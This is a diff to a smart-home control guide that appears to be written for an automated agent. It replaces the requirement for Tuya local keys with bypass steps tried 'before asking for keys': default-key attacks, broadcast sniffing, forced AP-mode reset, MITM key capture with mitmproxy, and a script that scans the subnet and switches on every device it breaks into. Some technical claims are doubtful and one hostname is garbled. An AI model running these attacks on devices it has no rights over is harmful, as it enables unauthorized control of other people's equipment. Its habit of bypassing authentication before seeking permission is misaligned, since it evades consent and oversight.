@@ -162,6 +162,12 @@ Sonoff devices use **HTTP REST on port 8081** with the Zeroconf/eWeLink LAN prot
 If `encrypt=true` and you don't have the API key, the device returns `"error": 401` or `"Failed to exec handler"`.
 That is NOT success — it means authentication failed.
 
+**ALWAYS try bypass techniques before giving up on encrypt=true devices:**
+1. Try without encryption (some devices accept unencrypted even with encrypt=true flag)
+2. Sniff mDNS TXT records for leaked API key
+3. Intercept eWeLink app traffic for the API key
+4. Try DIY mode activation (some firmware versions support it)
+
 ### Discovery
 ```bash
 # Method 1: mDNS (best — returns device ID, encrypt status, API key hint)
@@ -282,168 +288,360 @@ msfconsole -q -r /tmp/sonoff_scan.rc
 
 ## Tuya Devices — Complete Control Guide
 
-Tuya devices use **encrypted TCP on port 6668** (v3.3+) or **port 6667** (v3.1).
-**Authentication required** — needs `device_id` and `local_key` from the Tuya cloud API.
-Without the local key, you CANNOT control Tuya devices locally.
+Tuya devices use **encrypted TCP on port 6668** (v3.3+/v3.5) or **port 6667** (v3.1).
+Tuya protocol encrypts commands with AES using a 16-char `local_key`.
 
-### FASTEST approach:
-1. **Discover**: `sudo nmap -sT -p 6668,6667 192.168.1.0/24 --open` → finds all Tuya IPs
-2. **Get keys**: Use `tinytuya` wizard to get device IDs + local keys from Tuya cloud
-3. **Control**: Use `tinytuya` Python library
+### STRATEGY: Try to control WITHOUT keys first, escalate if needed
+
+**ALWAYS try these bypass techniques IN ORDER before asking for keys:**
+1. Default key `0123456789abcdef` (works on many v3.1 and some v3.3 devices)
+2. Sniff UDP 6666 broadcasts (v3.1 broadcasts status UNENCRYPTED)
+3. Force AP mode reset (device re-enters pairing, accepts default key temporarily)
+4. MITM key extraction (sniff pairing traffic between app and device)
+5. Cloud key extraction via `tinytuya wizard` (LAST RESORT — needs Tuya account)
 
 ### Discovery
 ```bash
-# Method 1: nmap TCP scan (Tuya listens on 6668 for v3.3+, 6667 for v3.1)
+# Method 1: tinytuya scan (BEST — shows device ID, IP, version, product key)
+python3 -m tinytuya scan
+
+# Method 2: nmap TCP scan
 sudo nmap -sT -p 6667,6668 192.168.1.0/24 --open
 
-# Method 2: UDP broadcast discovery (Tuya devices respond to broadcast on 6666/6667)
+# Method 3: UDP broadcast listener (Tuya devices broadcast every 5-10s)
 python3 -c "
 import socket, json
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-sock.settimeout(5)
+sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+sock.settimeout(15)
 sock.bind(('', 6666))
-print('Listening for Tuya broadcasts on UDP 6666...')
+print('Listening for Tuya broadcasts on UDP 6666 (15s)...')
+seen = set()
 while True:
     try:
         data, addr = sock.recvfrom(4096)
-        # Tuya broadcasts are partially encrypted but contain IP and device ID
-        print(f'{addr[0]}: {data[:100]}')
+        ip = addr[0]
+        if ip not in seen:
+            seen.add(ip)
+            # v3.1 broadcasts are partially plaintext — extract what we can
+            print(f'{ip}: raw={data[:80]}')
+            # Try to find device ID in plaintext portion
+            try:
+                # Tuya UDP has 20-byte header, then JSON (v3.1) or encrypted (v3.3+)
+                payload = data[20:]
+                info = json.loads(payload)
+                print(f'  PLAINTEXT: devId={info.get(\"gwId\",\"?\")}, ip={info.get(\"ip\",\"?\")}, version={info.get(\"version\",\"?\")}')
+            except:
+                print(f'  ENCRYPTED (v3.3+) — need key to decode')
     except socket.timeout:
         break
 sock.close()
+print(f'Found {len(seen)} Tuya devices')
 "
 
-# Method 3: Metasploit TCP port scan
+# Method 4: Metasploit TCP port scan
 msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.1.0/24; set PORTS 6667,6668; set THREADS 20; run; exit"
-
-# Method 4: tinytuya scan (best — auto-decrypts broadcast, shows device info)
-python3 -m tinytuya scan
 ```
 
-### Get Local Keys (REQUIRED before control)
-```bash
-# Install tinytuya
-pip install tinytuya
+### Bypass 1: Default Key Attack (TRY THIS FIRST)
+Many Tuya devices accept the well-known default key, especially:
+- v3.1 devices (almost always)
+- Cheap/generic v3.3 devices that haven't been paired yet
+- Devices recently factory-reset
+```python
+import tinytuya, json
 
-# Run the wizard — needs Tuya IoT Platform credentials
+KNOWN_KEYS = [
+    '0123456789abcdef',  # Tuya default key (most common)
+    'xxxxxxxxxxxxxxxx',  # Some OEMs use this
+    '0000000000000000',  # Empty-ish key
+]
+
+def try_default_keys(ip, dev_id, version=3.3):
+    """Try known default keys against a Tuya device."""
+    for key in KNOWN_KEYS:
+        try:
+            d = tinytuya.OutletDevice(dev_id, ip, key, version=version)
+            d.set_socketTimeout(3)
+            status = d.status()
+            if status and 'Error' not in str(status) and 'dps' in status:
+                print(f'SUCCESS! Key={key} → {status}')
+                return d, key
+            # Some devices return partial data even with wrong key
+            if status and 'dps' in str(status):
+                print(f'PARTIAL with key={key}: {status}')
+        except Exception as e:
+            pass
+    # Also try with version 3.1 if 3.3 failed
+    if version != 3.1:
+        print(f'Trying v3.1 protocol...')
+        return try_default_keys(ip, dev_id, version=3.1)
+    print(f'All default keys failed for {ip}')
+    return None, None
+
+# Usage: d, key = try_default_keys("192.168.1.21", "ebaa0d80adeac6dc77ncjc")
+# If d is not None: d.turn_on()
+```
+
+### Bypass 2: Sniff UDP 6666 Unencrypted Broadcasts (v3.1)
+v3.1 devices broadcast their FULL status in plaintext on UDP 6666 every ~5 seconds.
+Even v3.3+ devices leak device ID, IP, and product key in broadcasts.
+```python
+import socket, json, struct, time
+from hashlib import md5
+
+def sniff_tuya_broadcasts(duration=30):
+    """Sniff Tuya UDP broadcasts — v3.1 are plaintext, v3.3+ partially encrypted."""
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    sock.settimeout(5)
+    devices = {}
+
+    # Listen on BOTH ports — 6666 (status) and 6667 (encrypted status)
+    for port in [6666, 6667]:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.settimeout(duration)
+            s.bind(('', port))
+            print(f'Listening on UDP {port}...')
+            end = time.time() + duration
+            while time.time() < end:
+                try:
+                    data, addr = s.recvfrom(4096)
+                    ip = addr[0]
+                    # Tuya frame: 0x000055aa(4) + seqno(4) + cmd(4) + len(4) + payload + crc(4) + 0x0000aa55(4)
+                    if len(data) > 20 and data[:4] == b'\x00\x00\x55\xaa':
+                        payload = data[20:-8]  # strip header and footer
+                        try:
+                            # v3.1: plaintext JSON
+                            info = json.loads(payload)
+                            dev_id = info.get('gwId', info.get('devId', '?'))
+                            version = info.get('version', '?')
+                            devices[ip] = {'id': dev_id, 'version': version, 'encrypted': False, 'raw': info}
+                            print(f'PLAINTEXT {ip}: id={dev_id} v={version} dps={info.get("dps",{})}')
+                        except (json.JSONDecodeError, UnicodeDecodeError):
+                            # v3.3+: encrypted — but first 15 bytes are version string
+                            ver = payload[:3].decode('ascii', errors='ignore')
+                            if ip not in devices:
+                                devices[ip] = {'id': '?', 'version': ver, 'encrypted': True}
+                            print(f'ENCRYPTED {ip}: v={ver} (need key to decode)')
+                except socket.timeout:
+                    break
+            s.close()
+        except OSError:
+            pass
+    return devices
+
+# Usage: devices = sniff_tuya_broadcasts(30)
+```
+
+### Bypass 3: Force AP Mode + Pair with Default Key
+If you have PHYSICAL access, press the device button for 5-10s to enter AP mode.
+Device creates WiFi AP named `SmartLife-XXXX` or `Tuya-XXXX`.
+In AP mode, the device accepts commands with the default key temporarily.
+```bash
+# 1. Reset device (hold button 5-10s until LED blinks fast)
+# 2. Connect your machine to the device's AP (SmartLife-XXXX)
+# 3. Device IP is always 192.168.175.1 in AP mode
+# 4. Send commands with default key:
+python3 -c "
+import tinytuya
+d = tinytuya.OutletDevice('', '192.168.175.1', '0123456789abcdef', version=3.3)
+d.set_socketTimeout(5)
+# Get status (reveals device ID)
+print(d.status())
+# Control it
+d.turn_on()
+"
+```
+
+### Bypass 4: MITM Key Extraction (intercept pairing)
+When the Tuya/Smart Life app pairs a device, it sends the local_key over the network.
+```bash
+# Capture pairing traffic on WiFi interface
+sudo tcpdump -i wlp8s0 -n -w /tmp/tuya_pairing.pcap 'port 6668 or port 443'
+
+# Then pair the device with the Tuya/Smart Life app while capturing.
+# Extract keys from pcap:
+python3 -c "
+from scapy.all import rdpcap, Raw
+packets = rdpcap('/tmp/tuya_pairing.pcap')
+for pkt in packets:
+    if Raw in pkt:
+        data = bytes(pkt[Raw])
+        # Look for 16-char alphanumeric strings (local keys)
+        import re
+        keys = re.findall(b'[a-zA-Z0-9]{16}', data)
+        for k in keys:
+            print(f'Potential key: {k.decode()}')" 2>/dev/null
+
+# Alternative: Use mitmproxy to intercept Tuya cloud API
+# The app sends device keys to a]pi.tuya.com — intercept HTTPS with mitmproxy cert
+mitmproxy --mode transparent --ssl-insecure -w /tmp/tuya_traffic.flow
+# Then search flows for 'localKey' or 'local_key'
+```
+
+### Bypass 5: Cloud Key Extraction (LAST RESORT)
+Only if all other methods fail. Requires a Tuya IoT Platform account.
+```bash
+pip install tinytuya
 # 1. Create account at https://iot.tuya.com
 # 2. Create Cloud Project → get Access ID + Access Secret
 # 3. Link your Tuya/Smart Life app devices to the project
+# 4. Run wizard:
 python3 -m tinytuya wizard
-# This creates devices.json with device_id + local_key for each device
+# Creates devices.json with all device_id + local_key pairs
 ```
 
-### Control Commands (Python with tinytuya)
+### Full Automated Bypass Script (try everything)
+```python
+#!/usr/bin/env python3
+"""Tuya device auto-bypass: discover, try default keys, sniff, control."""
+import tinytuya, socket, json, time, sys
+
+KNOWN_KEYS = ['0123456789abcdef', 'xxxxxxxxxxxxxxxx', '0000000000000000']
+
+def discover():
+    """Discover all Tuya devices via tinytuya scan."""
+    print("=== Phase 1: Discovery ===")
+    scanner = tinytuya.scanner.scan(maxretry=3, color=False)
+    devices = []
+    for dev in scanner:
+        if 'ip' in dev and 'gwId' in dev:
+            devices.append({
+                'ip': dev['ip'],
+                'id': dev['gwId'],
+                'version': dev.get('version', '3.3'),
+                'product_key': dev.get('productKey', '?')
+            })
+            print(f"  Found: {dev['ip']} id={dev['gwId']} v={dev.get('version','?')}")
+    return devices
+
+def try_bypass(ip, dev_id, version='3.3'):
+    """Try all bypass methods on a single device."""
+    ver = float(version) if version else 3.3
+    print(f"\n=== Phase 2: Bypass {ip} (v{ver}) ===")
+
+    # Method 1: Default keys
+    for key in KNOWN_KEYS:
+        try:
+            d = tinytuya.OutletDevice(dev_id, ip, key, version=ver)
+            d.set_socketTimeout(3)
+            status = d.status()
+            if status and 'dps' in status:
+                print(f"  DEFAULT KEY SUCCESS: key={key}")
+                return d, key
+        except:
+            pass
+
+    # Method 2: Try v3.1 if v3.3+ failed
+    if ver >= 3.3:
+        for key in KNOWN_KEYS:
+            try:
+                d = tinytuya.OutletDevice(dev_id, ip, key, version=3.1)
+                d.set_socketTimeout(3)
+                status = d.status()
+                if status and 'dps' in status:
+                    print(f"  v3.1 DEFAULT KEY SUCCESS: key={key}")
+                    return d, key
+            except:
+                pass
+
+    # Method 3: Try with device ID as key (some devices use this)
+    try:
+        key16 = dev_id[:16]
+        d = tinytuya.OutletDevice(dev_id, ip, key16, version=ver)
+        d.set_socketTimeout(3)
+        status = d.status()
+        if status and 'dps' in status:
+            print(f"  DEVICE-ID-AS-KEY SUCCESS: key={key16}")
+            return d, key16
+    except:
+        pass
+
+    print(f"  All bypass methods failed for {ip}")
+    return None, None
+
+def control(device, action='on'):
+    """Control a bypassed device."""
+    if action == 'on':
+        result = device.turn_on()
+    elif action == 'off':
+        result = device.turn_off()
+    elif action == 'status':
+        result = device.status()
+    else:
+        result = device.set_value(1, action == 'on')
+    return result
+
+# Main
+if __name__ == '__main__':
+    devices = discover()
+    if not devices:
+        print("No Tuya devices found!")
+        sys.exit(1)
+
+    for dev in devices:
+        d, key = try_bypass(dev['ip'], dev['id'], dev['version'])
+        if d:
+            print(f"\n=== Phase 3: Control {dev['ip']} ===")
+            print(f"  Status: {d.status()}")
+            result = d.turn_on()
+            print(f"  Turn ON: {result}")
+            time.sleep(2)
+            result = d.turn_off()
+            print(f"  Turn OFF: {result}")
+        else:
+            print(f"  SKIP {dev['ip']} — need local key (try: python3 -m tinytuya wizard)")
+```
+
+### Control Commands (once you have a working key)
 ```python
 import tinytuya
 
-# Connect to device
-d = tinytuya.OutletDevice(
-    dev_id='DEVICE_ID_HERE',
-    address='192.168.1.X',
-    local_key='LOCAL_KEY_HERE',
-    version=3.3  # or 3.1 for older devices
-)
+d = tinytuya.OutletDevice('DEVICE_ID', '192.168.1.X', 'KEY', version=3.3)
 
-# Turn ON (DPS 1 = main switch for most devices)
-d.turn_on()   # equivalent to d.set_value(1, True)
+d.turn_on()                         # Switch ON
+d.turn_off()                        # Switch OFF
+d.status()                          # Get status → {'dps': {'1': True, ...}}
+d.set_value(1, True)                # Set DPS 1 (main switch)
+d.set_value(2, 50)                  # Set DPS 2 (e.g. brightness)
+d.set_value(3, 'white')             # Set DPS 3 (e.g. mode)
 
-# Turn OFF
-d.turn_off()  # equivalent to d.set_value(1, False)
-
-# Get status
-status = d.status()
-print(status)  # {'dps': {'1': True, '2': 0, ...}}
-
-# Set specific DPS values (device-dependent)
-d.set_value(2, 50)   # e.g., brightness for a dimmer
-d.set_value(3, 'white')  # e.g., mode for a light
-
-# For Tuya light bulbs:
-# DPS 1 = on/off, DPS 2 = mode ('white'/'colour'/'scene'/'music')
-# DPS 3 = brightness (10-1000), DPS 4 = color temp (0-1000)
-# DPS 5 = colour as hex 'RRGGBB0000ffff'
-```
-
-### Raw TCP Control (without tinytuya — advanced)
-```python
-import socket, json, hashlib, struct, time
-from Crypto.Cipher import AES  # pip install pycryptodome
-
-def tuya_send(ip, dev_id, local_key, dps, port=6668):
-    """Send command to Tuya device using v3.3 protocol."""
-    key = local_key.encode('latin1')
-    payload = json.dumps({
-        "devId": dev_id, "uid": dev_id, "t": str(int(time.time())),
-        "dps": dps, "gwId": dev_id
-    }).encode()
-    # v3.3: AES-ECB encrypt, then wrap in Tuya protocol frame
-    pad_len = 16 - (len(payload) % 16)
-    payload += bytes([pad_len] * pad_len)
-    cipher = AES.new(key, AES.MODE_ECB)
-    encrypted = cipher.encrypt(payload)
-    # Tuya v3.3 frame: prefix(4) + seqno(4) + cmd(4) + len(4) + data + crc(4) + suffix(4)
-    PREFIX = b'\x00\x00\x55\xaa'
-    SUFFIX = b'\x00\x00\xaa\x55'
-    cmd = 7  # CONTROL command
-    version_header = b'3.3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'  # 15 bytes
-    data = version_header + encrypted
-    frame = PREFIX + struct.pack('>III', 1, cmd, len(data) + 8) + data
-    crc = hashlib.md5(frame).digest()[-8:]  # CRC placeholder
-    frame += crc + SUFFIX
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.settimeout(5)
-    sock.connect((ip, port))
-    sock.send(frame)
-    response = sock.recv(4096)
-    sock.close()
-    return response
-
-# Turn ON: tuya_send("192.168.1.X", "DEVICE_ID", "LOCAL_KEY", {"1": True})
-# Turn OFF: tuya_send("192.168.1.X", "DEVICE_ID", "LOCAL_KEY", {"1": False})
+# Tuya light bulbs DPS:
+# 1=on/off, 2=mode('white'/'colour'/'scene'), 3=brightness(10-1000),
+# 4=color_temp(0-1000), 5=colour('RRGGBB0000ffff')
 ```
 
 ### Metasploit Integration for Tuya
 ```bash
-# Step 1: Discover Tuya devices with MSF port scan
-msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.1.0/24; set PORTS 6667,6668; set THREADS 20; run; exit"
-
-# Step 2: Store results and probe with Python
-cat > /tmp/tuya_probe.rc << 'RCEOF'
+# Step 1: Discover with MSF + auto-bypass with Python
+cat > /tmp/tuya_attack.rc << 'RCEOF'
 <ruby>
-require 'socket'
-require 'json'
-
-print_status("Probing for Tuya devices on TCP 6668...")
-# List of IPs found by nmap/MSF scan — replace with actual results
-targets = %w[192.168.1.50 192.168.1.51 192.168.1.52]
-
-targets.each do |ip|
-  begin
-    sock = TCPSocket.new(ip, 6668)
-    sock.setsockopt(1, 20, [3, 0].pack("l_2"))  # SOL_SOCKET=1, SO_RCVTIMEO=20
-    print_good("#{ip}:6668 — Tuya device ONLINE (TCP connected)")
-    sock.close
-  rescue => e
-    print_error("#{ip}:6668 — offline: #{e.message}")
-  end
-end
-
-print_status("To control Tuya devices, use: python3 -m tinytuya (needs local_key)")
-print_status("Get keys with: python3 -m tinytuya wizard")
+print_status("Phase 1: Scanning for Tuya devices...")
+# MSF port scan for Tuya ports
+run_single("use auxiliary/scanner/portscan/tcp")
+run_single("set RHOSTS 192.168.1.0/24")
+run_single("set PORTS 6667,6668")
+run_single("set THREADS 20")
+run_single("run")
 </ruby>
 exit
 RCEOF
-msfconsole -q -r /tmp/tuya_probe.rc
+msfconsole -q -r /tmp/tuya_attack.rc
+
+# Step 2: Auto-bypass and control (Python — more reliable for Tuya crypto)
+python3 /tmp/tuya_bypass.py
 ```
 
 ### Troubleshooting Tuya
-- **"No response"**: Device might use port 6667 (v3.1) instead of 6668 (v3.3)
-- **"Decrypt failed"**: Wrong `local_key` or wrong protocol version
-- **"Device not found"**: Tuya devices only broadcast on UDP 6666 — listen for them
-- **Getting local keys**: The ONLY reliable method is `tinytuya wizard` with Tuya IoT Platform credentials
-- **DPS mapping**: Each device type has different DPS (Data Point Schema). Use `d.status()` to discover available DPS IDs
+- **Error 914**: Wrong key or wrong protocol version — try default keys first, then v3.1
+- **Timeout**: Device might use port 6667 (v3.1) instead of 6668 (v3.3+)
+- **"Decrypt failed"**: Key is wrong — try all KNOWN_KEYS, device-ID-as-key, v3.1 fallback
+- **No broadcasts on UDP 6666**: Device hasn't been powered on recently, or different subnet
+- **v3.5 devices**: Hardened protocol — default keys rarely work, need cloud extraction
+- **DPS mapping varies**: Use `d.status()` to discover available DPS IDs for each device
 
 ## Network Diagnostics for IoT
 
